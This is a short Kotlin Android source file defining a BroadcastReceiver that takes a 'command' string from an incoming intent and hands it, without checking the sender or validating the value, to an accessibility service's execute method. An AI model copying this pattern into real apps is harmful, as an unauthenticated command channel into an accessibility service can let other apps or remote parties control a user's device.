package tj.soni.z

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class ZCommandReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {

        if (intent.action != "tj.soni.z.COMMAND") {
            return
        }

        val command = intent.getStringExtra("command") ?: return

        ZAccessibilityService.execute(command)
    }
}
